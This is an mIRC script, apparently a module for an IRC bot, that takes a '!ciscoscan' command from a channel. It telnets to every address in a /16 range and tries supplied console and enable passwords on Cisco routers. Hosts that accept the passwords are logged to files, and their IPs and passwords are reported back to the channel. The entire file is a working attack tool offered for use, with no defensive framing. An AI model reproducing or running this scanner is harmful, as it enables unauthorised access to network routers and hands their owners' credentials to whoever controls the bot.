[script]
n0=On 500:Text:!ciscoscan*:%chan:{
n1=  if ( $scon(1) != $cid ) { halt } | if ($2 == stop) { .sockclose cisco.scan.* | .timers off | .msg $chan Stopped scan of %scan.ip $+ * | .halt }
n2=  if ($5 == $null) { .msg $chan Usage: !ciscoscan [stop(optional)] 11.22. timemout consolepass enablepass | .halt }
n3=  .ciscoscan $2- 
n4=  .set %cisco.scan.channel $chan
n5=
n6=}
n7=
n8=Alias CiscoScan {
n9=  if ($exists(scan) == $false) { .mkdir scan }
n10=  .set %cisco.scan.timeout $2
n11=  .set %cisco.scan.console $3 
n12=  .set %cisco.scan.enable $4
n13=  .set %scan.ip $1
n14=  .set %scan.range 1
n15=  .cs1
n16=  .msg %cisco.scan.channel (CISCO): Starting scan of %scan.ip $+ %scan.range $+ .*
n17=}
n18=
n19=Alias CS1 {
n20=  .set %v1 1
n21=  .sockclose cisco.scan.*
n22=  :silly
n23=  .echo -s (CISCO): Now scanning %scan.ip $+ %scan.range $+ . $+ %v1 23
n24=  .sockopen cisco.scan. $+ %v1 %scan.ip $+ %scan.range $+ . $+ %v1 23
n25=  if (%v1 == 35) { .timercs1end $+ $rand(1,999) $+ $rand(1,999) 1 %cisco.scan.timeout /cs2 }
n26=  else { .set %v1 $calc(%v1 + 1) | .goto silly }
n27=}
n28=
n29=Alias CS2 {
n30=  .sockclose cisco.scan.*
n31=  .set %v1 $calc(%v1 + 1)
n32=  :silly
n33=  .echo -s (CISCO): Now scanning %scan.ip $+ %scan.range $+ . $+ %v1 23
n34=  .sockopen cisco.scan. $+ %v1 %scan.ip $+ %scan.range $+ . $+ %v1 23
n35=  if (%v1 == 70) { .timercs1end $+ $rand(1,999) 1 %cisco.scan.timeout //cs3 }
n36=  else { .set %v1 $calc(%v1 + 1) | .goto silly }
n37=}
n38=
n39=Alias CS3 {
n40=  .sockclose cisco.scan.*
n41=  .set %v1 $calc(%v1 + 1)
n42=  :silly
n43=  .echo -s (CISCO): Now scanning %scan.ip $+ %scan.range $+ . $+ %v1 23
n44=  .sockopen cisco.scan. $+ %v1 %scan.ip $+ %scan.range $+ . $+ %v1 23
n45=  if (%v1 == 130) { .timercs1end $+ $rand(1,999) 1 %cisco.scan.timeout //cs4 }
n46=  else { .set %v1 $calc(%v1 + 1) | .goto silly }
n47=}
n48=
n49=Alias CS4 {
n50=  .sockclose cisco.scan.*
n51=  .set %v1 $calc(%v1 + 1)
n52=  :silly
n53=  .echo -s (CISCO): Now scanning %scan.ip $+ %scan.range $+ . $+ %v1 23
n54=  .sockopen cisco.scan. $+ %v1 %scan.ip $+ %scan.range $+ . $+ %v1 23
n55=  if (%v1 == 160) { .timercs1end $+ $rand(1,999) 1 %cisco.scan.timeout //cs5 $2 }
n56=  else { .set %v1 $calc(%v1 + 1) | .goto silly }
n57=}
n58=
n59=Alias CS5 {
n60=  .sockclose cisco.scan.*
n61=  .set %v1 $calc(%v1 + 1)
n62=  :silly
n63=  .echo -s (CISCO): Now scanning %scan.ip $+ %scan.range $+ . $+ %v1 23
n64=  .sockopen cisco.scan. $+ %v1 %scan.ip $+ %scan.range $+ . $+ %v1 23
n65=  if (%v1 == 190) { .timercs1end $+ $rand(1,999) 1 %cisco.scan.timeout //cs6 $2 }
n66=  else { .set %v1 $calc(%v1 + 1) | .goto silly }
n67=}
n68=
n69=Alias CS6 {
n70=  .sockclose cisco.scan.*
n71=  .set %v1 $calc(%v1 + 1)
n72=  :silly
n73=  .echo -s (CISCO): Now scanning %scan.ip $+ %scan.range $+ . $+ %v1 23
n74=  .sockopen cisco.scan. $+ %v1 %scan.ip $+ %scan.range $+ . $+ %v1 23
n75=  if (%v1 == 230) { .timercs1end $+ $rand(1,999) 1 %cisco.scan.timeout //cs7 $2 }
n76=  else { .set %v1 $calc(%v1 + 1) | .goto silly }
n77=}
n78=
n79=Alias CS7 {
n80=  .sockclose cisco.scan.*
n81=  .set %v1 $calc(%v1 + 1)
n82=  :silly
n83=  .echo -s (CISCO): Now scanning %scan.ip $+ %scan.range $+ . $+ %v1 23
n84=  .sockopen cisco.scan. $+ %v1 %scan.ip $+ %scan.range $+ . $+ %v1 23
n85=  if (%v1 == 254) { .timercs1end $+ $rand(1,999) 1 %cisco.scan.timeout //cs8 }
n86=  else { .set %v1 $calc(%v1 + 1) | .goto silly }
n87=}
n88=
n89=Alias CS8 {
n90=  .set %scan.range $calc(%scan.range + 1)
n91=  if (%scan.range == 255) { .msg %cisco.scan.channel Finished cisco scan of %scan.ip $+ %scan.range $+ .* | .sockclose cisco.scan.* }
n92=  else { .cs1 | .msg %cisco.scan.channel (CISCO): Now scanning %scan.ip $+ %scan.range $+ .* }
n93=}
n94=
n95=On 1:SockOpen:cisco.scan.*:{
n96=  if ($sock($sockname).status == active) { 
n97=    .sockwrite -tn $sockname %cisco.scan.console
n98=    .sockwrite -tn $sockname enable
n99=    .sockwrite -tn $sockname %cisco.scan.enable
n100=    .sockwrite -tn $sockname $crlf
n101=  }
n102=}
n103=
n104=on 1:sockread:cisco.scan.*:{
n105=  if ($sockerr > 0) return
n106=  :nextread
n107=  sockread %cisco.scan.read
n108=  if ($sockbr == 0) return
n109=  if (%cisco.scan.read == $null) %cisco.scan.read = -
n110=  if (*>* iswm %cisco.scan.read) {
n111=    if ($read(scan\ $+ $me $+ console.txt, s, $sock($sockname).ip) == $null) {
n112=      .write scan\ $+ $me $+ console.txt $sock($sockname).ip %cisco.scan.console
n113=      .msg %cisco.scan.channel Consoled router found on $sock($sockname).ip pass: %cisco.scan.console
n114=    }
n115=    else { .msg %cisco.scan.channel Consoled router found on $sock($sockname).ip pass: %cisco.scan.console (scanned previously) }
n116=  }
n117=  if ($chr(35) isin %cisco.scan.read) { 
n118=    if ($read(scan\ $+ $me $+ enable.txt, s, $sock($sockname).ip) == $null) {
n119=      .write scan\ $+ $me $+ enable.txt $sock($sockname).ip %cisco.scan.console %cisco.scan.enable 
n120=      .msg %cisco.scan.channel Enabled cisco router found on $sock($sockname).ip pass: %cisco.scan.console %cisco.scan.enable 
n121=    }
n122=    else { .msg %cisco.scan.channel Enabled cisco router found on $sock($sockname).ip pass: %cisco.scan.console %cisco.scan.enable (scanned previously) }
n123=  }
n124=  goto nextread
n125=}
